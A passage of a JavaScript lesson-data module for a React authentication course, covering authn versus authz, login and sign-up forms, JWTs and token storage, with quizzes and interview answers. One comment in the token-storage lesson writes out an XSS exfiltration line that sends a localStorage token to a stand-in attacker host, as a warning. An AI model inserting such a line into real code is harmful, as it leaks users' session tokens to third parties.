export default {
  "AUTH-001": {
    tldr: "**Authentication** (authn) answers *who are you?* **Authorization** (authz) answers *what may you do?* You log in once to prove identity; every action is then checked against your rights.",
    analogy: { icon: "☕", text: "At a café, showing your loyalty card proves who you are (authentication). Whether you may go behind the counter and change the menu depends on whether you're staff (authorization)." },
    visual: { type: "compare", title: "Two different questions",
      left: { label: "Authentication (who?)", tone: "neutral", points: [
        "Proves identity: email + password, Google login, passkey",
        "Happens once at login, then a cookie or token carries it",
        "Fails with **401 Unauthorized** (\"log in first\")",
        "Result: a `user` object, e.g. `{ id: 7, name: 'Asha' }`"
      ]},
      right: { label: "Authorization (may you?)", tone: "good", points: [
        "Checks rights: role, permission, ownership",
        "Happens on **every** request and screen",
        "Fails with **403 Forbidden** (\"we know you, but no\")",
        "Result: yes or no for one action, e.g. `edit:menu`"
      ]}
    },
    points: [
      "Authentication always comes first: you can't check rights for an unknown user.",
      "**401** = not logged in or session expired → send to login. **403** = logged in but not allowed → show \"no access\".",
      "In React, authz checks only **hide buttons** (UX). The **server** must re-check every request; the browser can be edited.",
      "Like ASP.NET Core: `UseAuthentication()` builds the user, `[Authorize(Roles = \"Admin\")]` decides access."
    ],
    code: { file: "Menu.jsx", lang: "jsx", src: `import { useState } from 'react';

// Who are you? (authentication result, normally from your auth context)
const user = { id: 7, name: 'Asha', role: 'customer' };

// What may you do? (authorization rule)
const rules = {
  customer: ['view:menu', 'place:order'],
  staff: ['view:menu', 'place:order', 'edit:menu'],
};
const can = (user, action) => rules[user?.role]?.includes(action) ?? false;

export default function Menu() {
  const [msg, setMsg] = useState('');

  async function saveMenu() {
    const res = await fetch('/api/menu', { method: 'PUT', credentials: 'include' });
    if (res.status === 401) setMsg('Please log in again');      // authn failed
    else if (res.status === 403) setMsg('You are not allowed'); // authz failed
    else setMsg('Menu saved');
  }

  if (!user) return <p>Please log in</p>;

  return (
    <section>
      <h2>Hi {user.name}</h2>
      {can(user, 'edit:menu') && <button onClick={saveMenu}>Edit menu</button>}
      <p>{msg}</p>
    </section>
  );
}`, walk: [
      { lines: [4], note: "Authentication gives you a **user**: identity plus facts like role." },
      { lines: [7, 8, 9, 10, 11], note: "Authorization is a rule: does this user's role allow this action?" },
      { lines: [17, 18, 19], note: "The server answers too: 401 means *who are you?*, 403 means *not allowed*." },
      { lines: [23], note: "No user at all → nothing to authorize yet; ask them to log in." },
      { lines: [28], note:"Hide the button for customers. This is UX only; the API still checks." }
    ]},
    output: "A customer sees \"Hi Asha\" and no Edit button. A staff user sees the button; saving shows \"Menu saved\" or an access message.",
    mistakes: [
      { bad: `if (res.status === 403) navigate('/login');`, good: `if (res.status === 401) navigate('/login');\nif (res.status === 403) setMsg('No access');`, why: "403 means the user **is** logged in. Sending them to login again loops forever; show a no-access message instead." },
      { bad: `// Only hide the button\n{isAdmin && <DeleteButton />}`, good: `// Hide it AND the server checks the role\n// DELETE /api/items/5 → 403 for non-admins`, why: "Anyone can open DevTools and call the API directly. Client checks are for convenience, not security." }
    ],
    practice: [
      { level: "B", q: "Classify: \"wrong password\", \"customer opens admin page\", \"token expired\".", a: "Wrong password and expired token are **authentication** (401). Customer on admin page is **authorization** (403)." },
      { level: "B", q: "Add a `viewer` role that can only `view:menu`.", a: "Add `viewer: ['view:menu']` to `rules`. `can` needs no change.", code: `const rules = {\n  viewer: ['view:menu'],\n  customer: ['view:menu', 'place:order'],\n  staff: ['view:menu', 'place:order', 'edit:menu'],\n};` },
      { level: "I", q: "Why does `can` use `?.` and `?? false`?", a: "If the user is null or has an unknown role, `rules[role]` is undefined. Optional chaining avoids a crash and `?? false` denies by default." },
      { level: "C", q: "A user's role changes from staff to customer while they're logged in. What should happen?", a: "The server should deny immediately (it checks fresh data). The client updates on the next 403 or session refresh and hides staff UI." }
    ],
    quiz: [
      { q: "A logged-in customer calls `DELETE /api/products/3` and isn't allowed. Best status?", options: ["401 Unauthorized", "403 Forbidden", "404 Not Found", "500 Server Error"], answer: 1, why: "The server knows who they are (authenticated) but they lack the right: 403." },
      { q: "Which one must happen first?", options: ["Authorization", "Authentication", "They're the same step"], answer: 1, why: "You can't decide what someone may do until you know who they are." },
      { q: "Hiding the Admin button in React is enough to protect admin features.", options: ["True", "False"], answer: 1, why: "The client can be changed. The server must enforce every rule." }
    ],
    rev: {
      sec30: "Authentication proves identity (login → user). Authorization decides what that user may do (roles, permissions, ownership). 401 = not authenticated, 403 = authenticated but not allowed. React only hides UI based on rights; the server enforces them on every request.",
      interview: [
        { level: "basic", q: "Authentication vs authorization in one line each?", a: "Authentication: who are you (login). Authorization: what are you allowed to do (roles/permissions)." },
        { level: "intermediate", q: "401 vs 403: how should the React app react?", a: "401: clear the session and send to login (or try a refresh). 403: stay logged in and show a no-access message." },
        { level: "advanced", q: "Where should authorization live in a React + API app?", a: "On the server for every request. The client mirrors the rules only to hide or disable UI so users don't hit errors." },
        { level: "tricky", q: "Is OAuth authentication or authorization?", a: "OAuth 2.0 is delegated **authorization** (access to an API). OpenID Connect adds the **authentication** layer (an ID token) on top." }
      ],
      scenario: [
        { q: "Users report being bounced to login after clicking Delete, even though they're logged in.", a: "The app treats 403 like 401. Split them: 401 → login, 403 → \"you don't have access\"." }
      ],
      cheat: [
        "Authn = who you are; Authz = what you may do",
        "Authn first, then authz on every action",
        "401 → log in again; 403 → no access message",
        "Client checks = UX; server checks = security",
        "Deny by default when the role is unknown",
        "OAuth = authorization; OpenID Connect = authentication"
      ]
    },
    related: ["AUTH-007", "AUTH-008", "API-015", "API-004"]
  },

  "AUTH-002": {
    tldr: "A login form collects email and password, **validates** them, shows a **pending** state while the request runs, and shows clear **errors** for bad input or wrong credentials. On success it stores the session and navigates away.",
    analogy: { icon: "🎵", text: "Signing in to a music app: it greys out the button while checking, says \"wrong password\" if you typo, and drops you straight into your playlists when it works." },
    visual: { type: "flow", title: "What happens when you press Log in", steps: [
      { label: "Validate", detail: "Check the email looks valid and the password isn't empty. Show field errors, no request." },
      { label: "Pending", detail: "Disable the button and show \"Logging in…\" so users can't double-submit." },
      { label: "Request", detail: "`POST /api/login` with JSON body over HTTPS." },
      { label: "Error?", detail: "401 → \"Wrong email or password\". Network/500 → \"Try again\". Keep the email filled in." },
      { label: "Success", detail: "Save the user/token, then `navigate('/orders', { replace: true })`." }
    ]},
    points: [
      "React 19's `useActionState` gives you **result state + pending flag** for a form action in one hook.",
      "Validate on the client for speed, but the server validates again; never rely on the client alone.",
      "Use one vague message for bad credentials (\"Wrong email or password\"), so attackers can't tell which emails exist.",
      "React resets uncontrolled fields after a form action, so return the email and use it as `defaultValue`.",
      "Use `replace: true` when navigating after login so Back doesn't return to the login form."
    ],
    code: { file: "LoginPage.jsx", lang: "jsx", src: `import { useActionState } from 'react';
import { useNavigate } from 'react-router';

async function loginRequest(email, password) {
  const res = await fetch('/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include',
    body: JSON.stringify({ email, password }),
  });
  if (res.status === 401) throw new Error('Wrong email or password');
  if (!res.ok) throw new Error('Something went wrong. Try again.');
  return res.json();
}

export default function LoginPage() {
  const navigate = useNavigate();
  const [state, formAction, isPending] = useActionState(async (prev, formData) => {
    const email = formData.get('email').trim();
    const password = formData.get('password');
    const errors = {};
    if (!email.includes('@')) errors.email = 'Enter a valid email';
    if (!password) errors.password = 'Enter your password';
    if (Object.keys(errors).length) return { errors, email };
    try {
      await loginRequest(email, password);
      navigate('/orders', { replace: true });
      return { errors: {} };
    } catch (err) {
      return { errors: { form: err.message }, email };
    }
  }, { errors: {} });

  return (
    <form action={formAction} noValidate>
      {state.errors.form && <p role="alert">{state.errors.form}</p>}
      <input name="email" type="email" defaultValue={state.email} placeholder="Email" />
      {state.errors.email && <small>{state.errors.email}</small>}
      <input name="password" type="password" placeholder="Password" />
      {state.errors.password && <small>{state.errors.password}</small>}
      <button disabled={isPending}>{isPending ? 'Logging in…' : 'Log in'}</button>
    </form>
  );
}`, walk: [
      { lines: [11, 12], note: "Turn HTTP results into friendly messages: 401 = bad credentials, anything else = generic retry." },
      { lines: [18], note: "`useActionState` returns the last result, an action for the form, and `isPending`." },
      { lines: [21, 22, 23, 24], note: "Client validation: return field errors without calling the server." },
      { lines: [26, 27], note: "On success, go to the private page and replace the login entry in history." },
      { lines: [30], note: "On failure, return a form-level error and the email so the field stays filled." },
      { lines: [36, 41], note: "`role=\"alert\"` announces errors to screen readers; the button is disabled while pending." }
    ]},
    output: "Empty submit → \"Enter a valid email\" + \"Enter your password\". Wrong password → \"Wrong email or password\" banner. Correct → button shows \"Logging in…\" then the orders page.",
    mistakes: [
      { bad: `if (res.status === 404) setError('No account with that email');`, good: `setError('Wrong email or password');`, why: "Different messages for \"unknown email\" and \"wrong password\" let attackers discover which emails are registered (user enumeration)." },
      { bad: `<button onClick={handleLogin}>Log in</button>`, good: `<form action={formAction}>\n  <button disabled={isPending}>Log in</button>\n</form>`, why: "A real `<form>` submits on Enter, works with password managers, and a disabled button stops double submits." }
    ],
    practice: [
      { level: "B", q: "Add a \"Show password\" checkbox.", a: "Keep a boolean in state and switch the input `type` between `password` and `text`.", code: `const [show, setShow] = useState(false);\n<input name="password" type={show ? 'text' : 'password'} />\n<label><input type="checkbox" onChange={e => setShow(e.target.checked)} /> Show</label>` },
      { level: "B", q: "Add `autoComplete` hints so password managers fill the form.", a: "`autoComplete=\"email\"` on email and `autoComplete=\"current-password\"` on password." },
      { level: "I", q: "Handle 429 Too Many Requests.", a: "Add `if (res.status === 429) throw new Error('Too many attempts. Wait a minute.')` before the generic error." },
      { level: "C", q: "After login, send the user back to the page they came from instead of `/orders`.", a: "Read `?from=` (or `location.state.from`), check it's a same-site path, then `navigate(from, { replace: true })`. See AUTH-015 for the safe check." }
    ],
    quiz: [
      { q: "What does `isPending` from `useActionState` tell you?", options: ["The form has errors", "The action is still running", "The user is logged in", "The page is loading its JS"], answer: 1, why: "It's true from submit until the async action finishes." },
      { q: "Best message when the password is wrong?", options: ["\"Password incorrect for asha@shop.com\"", "\"No account with that email\"", "\"Wrong email or password\""], answer: 2, why: "A single vague message hides whether the email exists." },
      { q: "Why `navigate('/orders', { replace: true })` after login?", options: ["It's faster", "So Back doesn't return to the login form", "It clears the token"], answer: 1, why: "Replace swaps the login entry in history with the destination." }
    ],
    rev: {
      sec30: "A login flow = validate → pending → POST → handle errors → store session → navigate with replace. In React 19 `useActionState` gives result + `isPending` for a `<form action>`. Use one generic message for bad credentials, keep the email filled in, disable the button while pending, and let the server validate too.",
      interview: [
        { level: "basic", q: "What states does a login form need?", a: "Idle, field validation errors, pending (button disabled), server error, and success (redirect)." },
        { level: "intermediate", q: "Why use a `<form>` instead of a button with onClick?", a: "Enter submits, password managers detect it, it's accessible, and React 19 form actions give pending state for free." },
        { level: "advanced", q: "How do you prevent user enumeration on login?", a: "Return the same message and similar response time for unknown email and wrong password; also rate-limit attempts on the server." },
        { level: "tricky", q: "After a failed login with a form action, the email field is empty. Why?", a: "React resets uncontrolled form fields after the action. Return the email in the action state and pass it as `defaultValue`." }
      ],
      debug: [
        { code: `<form action={formAction}>\n  <button>Log in</button>\n</form>\n// user double-clicks → 2 requests`, fix: `<form action={formAction}>\n  <button disabled={isPending}>Log in</button>\n</form>`, why: "Disable submit while the action is pending." }
      ],
      cheat: [
        "Flow: validate → pending → POST → error or success",
        "`const [state, action, isPending] = useActionState(fn, init)`",
        "Generic error: \"Wrong email or password\"",
        "Disable the button while pending",
        "`navigate(to, { replace: true })` after login",
        "`autoComplete=\"current-password\"` helps password managers",
        "Server validates and rate-limits; client is just UX"
      ]
    },
    related: ["HOOKS-018", "AUTH-003", "AUTH-011", "ROUTE-017"]
  },

  "AUTH-003": {
    tldr: "Sign-up collects details, checks them (valid email, strong password, passwords match), creates the account, then **confirms** it, usually with an email link, before the user can fully log in.",
    analogy: { icon: "📬", text: "Joining a recipe club: you fill in a form, they post a welcome letter with a code, and you're a full member only after you use that code. The letter proves the address is really yours." },
    visual: { type: "flow", title: "Sign-up with email confirmation", steps: [
      { label: "Fill form", detail: "Name, email, password, confirm password." },
      { label: "Check locally", detail: "Valid email, 8+ characters, both passwords match. Show errors per field." },
      { label: "Create account", detail: "`POST /api/register`. 409 Conflict → \"Email already registered\"." },
      { label: "Check your inbox", detail: "Show a confirmation screen. The server emails a one-time link." },
      { label: "Confirm link", detail: "`/confirm?token=…` calls the API; the account becomes active, then log in." }
    ]},
    points: [
      "Client checks are for quick feedback; the server re-validates and hashes the password (never stored in plain text).",
      "**Confirm password** catches typos; **email confirmation** proves the user owns the address.",
      "After submit, show a clear \"Check your inbox\" screen with a **Resend** button instead of silently logging in.",
      "Prefer length over odd rules: 8+ characters and allow paste, so password managers work."
    ],
    code: { file: "SignUp.jsx", lang: "jsx", src: `import { useActionState } from 'react';

async function signUp(prev, formData) {
  const data = Object.fromEntries(formData);
  const errors = {};
  if (!data.email.includes('@')) errors.email = 'Enter a valid email';
  if (data.password.length < 8) errors.password = 'Use at least 8 characters';
  if (data.password !== data.confirm) errors.confirm = 'Passwords do not match';
  if (Object.keys(errors).length) return { errors, values: data };

  const res = await fetch('/api/register', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ name: data.name, email: data.email, password: data.password }),
  });
  if (res.status === 409) return { errors: { email: 'Email already registered' }, values: data };
  if (!res.ok) return { errors: { form: 'Could not sign up. Try again.' }, values: data };
  return { done: true, email: data.email };
}

export default function SignUp() {
  const [state, formAction, isPending] = useActionState(signUp, { errors: {}, values: {} });

  if (state.done) {
    return <p>📬 Check your inbox. We sent a link to <b>{state.email}</b>.</p>;
  }

  const { errors, values } = state;
  return (
    <form action={formAction} noValidate>
      <input name="name" defaultValue={values.name} placeholder="Name" />
      <input name="email" type="email" defaultValue={values.email} placeholder="Email" />
      {errors.email && <small>{errors.email}</small>}
      <input name="password" type="password" autoComplete="new-password" placeholder="Password" />
      {errors.password && <small>{errors.password}</small>}
      <input name="confirm" type="password" autoComplete="new-password" placeholder="Confirm password" />
      {errors.confirm && <small>{errors.confirm}</small>}
      {errors.form && <p role="alert">{errors.form}</p>}
      <button disabled={isPending}>{isPending ? 'Creating…' : 'Create account'}</button>
    </form>
  );
}`, walk: [
      { lines: [4], note: "`Object.fromEntries(formData)` turns the form into a plain object." },
      { lines: [6, 7, 8], note: "Three quick checks: email shape, length, and both passwords match." },
      { lines: [16], note: "409 Conflict from the API means the email exists; show it on the email field." },
      { lines: [18], note: "Success returns `done`, which switches the screen to the confirmation message." },
      { lines: [24, 25, 26], note: "The confirmation screen tells the user exactly what to do next." },
      { lines: [34], note: "`autoComplete=\"new-password\"` lets password managers suggest a strong password." }
    ]},
    output: "Mismatched passwords → \"Passwords do not match\". Taken email → \"Email already registered\". Success → \"📬 Check your inbox. We sent a link to asha@mail.com.\"",
    mistakes: [
      { bad: `localStorage.setItem('pendingPassword', password);`, good: `// Send it once over HTTPS; never keep it on the client`, why: "Passwords must never be stored in the browser. The server hashes them; the client forgets them after submit." },
      { bad: `<input type="password" onPaste={e => e.preventDefault()} />`, good: `<input type="password" autoComplete="new-password" />`, why: "Blocking paste breaks password managers and pushes users to weaker passwords." }
    ],
    practice: [
      { level: "B", q: "Add a Terms checkbox that must be ticked.", a: "Add `<input type=\"checkbox\" name=\"terms\" />`; in the action, `if (!data.terms) errors.terms = 'Please accept the terms'` (unchecked boxes are missing from FormData)." },
      { level: "I", q: "Build the `/confirm?token=…` page.", a: "Read `token` with `useSearchParams`, POST it to `/api/confirm` in an effect, show \"Confirming…\", then success or \"Link expired\" with a resend option.", code: `const [params] = useSearchParams();\nconst token = params.get('token');\nuseEffect(() => {\n  let ignore = false;\n  fetch('/api/confirm', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token }) })\n    .then(r => { if (!ignore) setStatus(r.ok ? 'ok' : 'expired'); });\n  return () => { ignore = true; };\n}, [token]);\n// Dev Strict Mode runs this twice: make the server treat a repeat confirm as success.` },
      { level: "I", q: "Add a Resend email button with a 60-second cooldown.", a: "On click, POST `/api/resend`, then disable the button and count down with `setInterval` in an effect, clearing it on unmount." },
      { level: "C", q: "Should the API reveal \"email already registered\"?", a: "It's a trade-off: it helps users but allows enumeration. A safer option is always saying \"Check your inbox\" and emailing existing users a \"you already have an account\" note." }
    ],
    quiz: [
      { q: "What does email confirmation prove?", options: ["The password is strong", "The user owns that email address", "The user isn't a robot"], answer: 1, why: "Only someone with inbox access can click the one-time link." },
      { q: "Which status suits \"email already taken\"?", options: ["400", "401", "409", "500"], answer: 2, why: "409 Conflict: the resource (an account with that email) already exists." },
      { q: "Where should the password be hashed?", options: ["In the React app before sending", "On the server", "In localStorage"], answer: 1, why: "The server hashes with a slow algorithm (bcrypt/Argon2). The client sends it over HTTPS." }
    ],
    rev: {
      sec30: "Registration: validate locally (email shape, length, confirm matches), POST to create, handle 409 for taken emails, then show a \"check your inbox\" screen. The confirm link page posts the token to activate the account. Server hashes passwords and re-validates everything.",
      interview: [
        { level: "basic", q: "Why have a confirm password field?", a: "Users can't see what they typed in a password field; a second entry catches typos before the account is created." },
        { level: "intermediate", q: "How do you show server errors on the right field?", a: "Map API responses to field keys (409 → `errors.email`) and return them from the action, along with the typed values." },
        { level: "advanced", q: "Why not log users in right after sign-up?", a: "You can, but until the email is confirmed you can't trust the address for password resets or notices. Many apps allow limited access until confirmed." },
        { level: "tricky", q: "An unchecked checkbox: what does `formData.get('terms')` return?", a: "`null`. Unchecked checkboxes aren't included in form data at all." }
      ],
      cheat: [
        "Sign-up: validate → POST → 409? → check inbox → confirm link",
        "Confirm password catches typos",
        "Email link proves ownership of the address",
        "`autoComplete=\"new-password\"` on both password fields",
        "Never block paste in password fields",
        "Server hashes passwords (bcrypt/Argon2), never the client"
      ]
    },
    related: ["AUTH-002", "HOOKS-018", "SEC-005", "ROUTE-012"]
  },

  "AUTH-004": {
    tldr: "A **JWT** (JSON Web Token) is a signed note from the server saying who you are and when it expires. Log in → get the token → send it as `Authorization: Bearer <token>` on each API call → server checks the signature.",
    analogy: { icon: "🎫", text: "A gig wristband with your name and \"valid until 23:00\" printed on it and a hologram seal. Staff check the seal, not a guest list. Anyone can read the wristband, but nobody can fake the seal." },
    visual: { type: "flow", title: "JWT login end to end", steps: [
      { label: "Log in", detail: "`POST /api/auth/login` with email + password." },
      { label: "Server signs", detail: "Server returns `header.payload.signature`, e.g. `{ sub: 7, role, exp }`." },
      { label: "Keep it in memory", detail: "Store the access token in a JS variable (see AUTH-005 for why)." },
      { label: "Send Bearer header", detail: "Every request: `Authorization: Bearer eyJhbGci…`." },
      { label: "Server verifies", detail: "Checks signature + `exp`. Valid → data. Invalid/expired → 401." }
    ]},
    points: [
      "A JWT has three Base64URL parts: **header.payload.signature**. The payload is readable by anyone; it's **signed, not encrypted**.",
      "Never put secrets (passwords, card numbers) in the payload.",
      "The client may **decode** the payload to show the name or check `exp`, but only the **server** verifies the signature.",
      "Access tokens should be short-lived (5-15 min); a refresh token gets new ones (AUTH-010).",
      "Signing keys live only on the server. A key in a `VITE_` variable ships to every browser."
    ],
    code: { file: "auth.js", lang: "js", src: `// The access token lives in memory (a module variable)
let accessToken = null;

export async function login(email, password) {
  const res = await fetch('/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password }),
  });
  if (!res.ok) throw new Error('Login failed');
  const data = await res.json();       // { accessToken: 'eyJ...' }
  accessToken = data.accessToken;
  return readClaims(accessToken);      // { sub, name, role, exp }
}

// Decode for DISPLAY only. The server verifies the signature.
export function readClaims(token) {
  const base64 = token.split('.')[1].replace(/-/g, '+').replace(/_/g, '/');
  return JSON.parse(atob(base64));
}

const isExpired = (token) => readClaims(token).exp * 1000 < Date.now();

export async function api(path, options = {}) {
  if (!accessToken || isExpired(accessToken)) throw new Error('Not logged in');
  const res = await fetch(path, {
    ...options,
    headers: { ...options.headers, Authorization: \`Bearer \${accessToken}\` },
  });
  if (res.status === 401) accessToken = null;   // server rejected it
  return res;
}

// const me = await login('asha@shop.com', 'secret123');
// const orders = await (await api('/api/orders')).json();`, walk: [
      { lines: [2], note: "A plain variable: gone on page reload, but out of reach of other storage-reading scripts." },
      { lines: [11, 12], note: "The server returns the signed token after checking the password." },
      { lines: [18, 19], note: "Take the middle part, convert Base64URL to Base64, decode JSON. Use the `jwt-decode` package for non-ASCII names." },
      { lines: [22], note: "`exp` is in **seconds**; `Date.now()` is in milliseconds, so multiply by 1000." },
      { lines: [28], note: "Attach the token as a Bearer header on every API call." },
      { lines: [30], note: "A 401 means the token is bad or expired on the server's clock: forget it." }
    ]},
    output: "`login()` resolves to `{ sub: 7, name: 'Asha', role: 'customer', exp: 1767225600 }`. Later `api('/api/orders')` sends `Authorization: Bearer eyJ…`.",
    mistakes: [
      { bad: `if (readClaims(token).role === 'admin') showAdminData();\n// data loaded without asking the server`, good: `// Use claims to pick UI; fetch admin data from the API,\n// which verifies the signature and role`, why: "Anyone can craft a token with `role: 'admin'`. Only the server can tell if the signature is real." },
      { bad: `exp < Date.now()`, good: `exp * 1000 < Date.now()`, why: "JWT `exp` is in seconds since 1970; JS time is in milliseconds. Without `* 1000`, every token looks long expired." }
    ],
    practice: [
      { level: "B", q: "Paste a JWT's middle part into `atob` in the console. What do you see?", a: "Readable JSON claims like `sub`, `name`, `exp`. This shows JWTs are not encrypted." },
      { level: "B", q: "Show \"Hi {name}\" in a header using the token.", a: "Call `readClaims(token).name` once after login and keep it in state or context." },
      { level: "I", q: "Show minutes until the token expires.", a: "`Math.round((claims.exp * 1000 - Date.now()) / 60000)`." },
      { level: "C", q: "Why might `isExpired` say \"valid\" but the server returns 401?", a: "Clock skew between devices, the token was revoked, or the signing key rotated. Always handle 401 even after a local check." }
    ],
    quiz: [
      { q: "Can anyone read a JWT's payload?", options: ["No, it's encrypted", "Yes, it's only Base64URL encoded", "Only the server"], answer: 1, why: "Standard JWTs (JWS) are signed, not encrypted. Decode with `atob`." },
      { q: "What stops a user from changing `role` to `admin`?", options: ["Base64 encoding", "The signature check on the server", "Storing it in localStorage"], answer: 1, why: "Changing the payload breaks the signature; the server rejects it." },
      { q: "Which header carries the token?", options: ["`Cookie: jwt=...`", "`Authorization: Bearer <token>`", "`X-Token: <token>` is required"], answer: 1, why: "The standard pattern for JWT access tokens is the Bearer scheme." }
    ],
    rev: {
      sec30: "JWT = header.payload.signature, signed by the server. Login returns it; the client keeps it (ideally in memory) and sends `Authorization: Bearer` on every request. The server verifies signature and `exp`. The client may decode claims for UI but must never trust them for security. Keep access tokens short-lived.",
      interview: [
        { level: "basic", q: "What are the three parts of a JWT?", a: "Header (algorithm), payload (claims like `sub`, `exp`), signature (proves it wasn't changed)." },
        { level: "intermediate", q: "Is it safe to decode a JWT in React?", a: "Yes for display (name, expiry). It's not a security check: only the server verifying the signature counts." },
        { level: "advanced", q: "JWT vs server session: trade-offs?", a: "JWTs are stateless and easy to use across services, but hard to revoke before expiry. Sessions are easy to revoke but need server-side storage. Short JWTs + refresh tokens get a middle ground." },
        { level: "tricky", q: "How do you log out a JWT before it expires?", a: "You can't delete it from the server's view; it's valid until `exp`. Keep it short-lived, revoke the refresh token, or keep a server deny-list." }
      ],
      predict: [
        { code: `const exp = 1700000000; // seconds\nconsole.log(exp < Date.now());`, answer: "true (always)", why: "Comparing seconds with milliseconds; multiply `exp` by 1000." }
      ],
      cheat: [
        "JWT = header.payload.signature",
        "Signed, not encrypted: never put secrets in it",
        "Send as `Authorization: Bearer <token>`",
        "`exp` is seconds; JS time is ms",
        "Decode for UI, server verifies for security",
        "Short access token + refresh token",
        "Signing key lives only on the server"
      ]
    },
    related: ["API-017", "API-016", "AUTH-005", "AUTH-010"]
  },

  "AUTH-005": {
    tldr: "Where you keep the token decides what can steal it. **localStorage** is readable by any script (XSS risk). **Memory** is safer but lost on reload. **httpOnly cookies** can't be read by JS but are sent automatically (CSRF risk).",
    analogy: { icon: "🔑", text: "Your flat key: under the doormat (localStorage) anyone who looks finds it; in your pocket (memory) it's safe but lost when you change clothes; with the doorman (httpOnly cookie) you can't touch it, but he lets in anyone using your name." },
    visual: { type: "compare", title: "Common setups",
      left: { label: "Token in localStorage", tone: "bad", points: [
        "Survives reloads and tabs: easy to code",
        "**Any** script on the page can read it (one XSS = stolen token)",
        "A stolen token works from the attacker's own machine",
        "No CSRF risk: you add the header yourself"
      ]},
      right: { label: "Memory + httpOnly refresh cookie", tone: "good", points: [
        "Access token in a JS variable, short-lived (minutes)",
        "Refresh token in an `HttpOnly; Secure; SameSite` cookie",
        "JS can't read the cookie, so XSS can't copy it out",
        "On reload, call `/refresh` to get a new access token"
      ]}
    },
    points: [
      "Recommended SPA default: **access token in memory**, **refresh token in an httpOnly cookie** (or a plain session cookie via a BFF).",
      "`HttpOnly` blocks JS reads; `Secure` = HTTPS only; `SameSite=Strict/Lax` blocks most cross-site sends (CSRF).",
      "XSS still lets an attacker **act** in the open tab with any storage. httpOnly limits *theft*, not misuse; preventing XSS is still job one.",
      "`sessionStorage` is per-tab but just as readable by scripts as localStorage."
    ],
    code: { file: "tokenStore.js", lang: "js", src: `// Access token in memory, refresh token in an httpOnly cookie
let accessToken = null;
export const getAccessToken = () => accessToken;

// On login the server responds with:
//   body:       { accessToken: 'eyJ...' }        (lives ~10 min)
//   Set-Cookie: refresh=abc; HttpOnly; Secure; SameSite=Strict; Path=/api/auth
export async function login(email, password) {
  const res = await fetch('/api/auth/login', {
    method: 'POST',
    credentials: 'include',              // let the browser store the cookie
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password }),
  });
  if (!res.ok) throw new Error('Login failed');
  accessToken = (await res.json()).accessToken;
}

// Page reload wiped memory: swap the cookie for a fresh access token
export async function restoreSession() {
  const res = await fetch('/api/auth/refresh', {
    method: 'POST',
    credentials: 'include',              // browser attaches the httpOnly cookie
  });
  if (!res.ok) return false;             // no cookie / expired: logged out
  accessToken = (await res.json()).accessToken;
  return true;
}

// ❌ localStorage.setItem('token', accessToken);
//    any injected script can do: fetch('https://evil.example/?t=' + localStorage.token)`, walk: [
      { lines: [2, 3], note: "The access token is a module variable. No storage API can expose it." },
      { lines: [6, 7], note: "The refresh token arrives as a cookie JS can never read; `Path` limits where it's sent." },
      { lines: [11], note: "`credentials: 'include'` is needed for the browser to accept and send cookies (cross-origin too)." },
      { lines: [20, 21, 22, 23, 24], note: "On app start, ask the server for a new access token; the cookie proves the session." },
      { lines: [30, 31], note: "Why not localStorage: one XSS bug lets any script send your token to an attacker." }
    ]},
    output: "After login: memory holds `eyJ…`, DevTools → Application → Cookies shows `refresh` with the HttpOnly tick. `document.cookie` doesn't include it.",
    mistakes: [
      { bad: `localStorage.setItem('refreshToken', token);`, good: `// Server: Set-Cookie: refresh=...; HttpOnly; Secure; SameSite=Strict`, why: "A long-lived refresh token in localStorage is the worst case: one XSS gives an attacker weeks of access." },
      { bad: `fetch('/api/auth/refresh', { method: 'POST' })\n// cross-origin API, cookie never sent`, good: `fetch('/api/auth/refresh', { method: 'POST', credentials: 'include' })`, why: "Cross-origin fetch skips cookies unless you opt in (and the server allows credentials in CORS)." }
    ],
    practice: [
      { level: "B", q: "Open DevTools on any site and find which cookies are HttpOnly.", a: "Application → Cookies: the HttpOnly column is ticked. Those don't appear in `document.cookie`." },
      { level: "B", q: "What happens to a memory token when the user presses F5?", a: "It's gone. The app must call `restoreSession()` on startup and show a \"checking\" state until it finishes." },
      { level: "I", q: "Call `restoreSession` once when the app starts, without a double call in Strict Mode causing trouble.", a: "Kick it off outside React (module level) or cache the promise, so dev's double effect reuses one request.", code: `let sessionPromise;\nexport const sessionReady = () => (sessionPromise ??= restoreSession());` },
      { level: "C", q: "Your API is on `api.shop.com` and the app on `shop.com`. What must be configured for the cookie to work?", a: "Same site, so `SameSite=Strict/Lax` is fine. CORS needs `Access-Control-Allow-Credentials: true` and an exact `Allow-Origin`, and fetch needs `credentials: 'include'`." }
    ],
    quiz: [
      { q: "Which storage can JavaScript **not** read?", options: ["localStorage", "sessionStorage", "httpOnly cookie", "A module variable"], answer: 2, why: "The browser hides httpOnly cookies from `document.cookie` and all JS." },
      { q: "Main risk of storing a token in localStorage?", options: ["CSRF", "XSS can read and steal it", "It expires on reload"], answer: 1, why: "Any script running on your page can read localStorage." },
      { q: "Main risk of cookie-based auth?", options: ["XSS reads the cookie", "CSRF: the browser sends it automatically", "It can't be sent over HTTPS"], answer: 1, why: "Cookies ride along with cross-site requests unless `SameSite` or a CSRF token stops them." }
    ],
    rev: {
      sec30: "localStorage: persistent but readable by any script (XSS theft). Memory: safest from theft but lost on reload. httpOnly cookie: unreadable by JS but auto-sent (CSRF, mitigated by SameSite). Common pattern: short access token in memory + refresh token in an httpOnly, Secure, SameSite cookie, restored via `/refresh` on load.",
      interview: [
        { level: "basic", q: "Why is localStorage risky for tokens?", a: "Any JavaScript on the page, including injected scripts or a compromised npm package, can read it and send it away." },
        { level: "intermediate", q: "What do HttpOnly, Secure and SameSite each do?", a: "HttpOnly: no JS access. Secure: only sent over HTTPS. SameSite: limits sending the cookie on cross-site requests, which blocks most CSRF." },
        { level: "advanced", q: "Does httpOnly make you safe from XSS?", a: "No. It stops the token being **stolen**, but an XSS script can still make requests as the user while the page is open. You still need to prevent XSS." },
        { level: "tricky", q: "If the access token is in memory, how does a new tab stay logged in?", a: "Each tab starts empty and calls `/refresh`; the shared httpOnly cookie gets it a fresh access token." }
      ],
      compare: { cols: ["", "localStorage", "Memory", "httpOnly cookie"], rows: [
        ["JS can read", "Yes", "Yes (your code only)", "No"],
        ["Survives reload", "Yes", "No", "Yes"],
        ["XSS theft", "Easy", "Hard", "Blocked"],
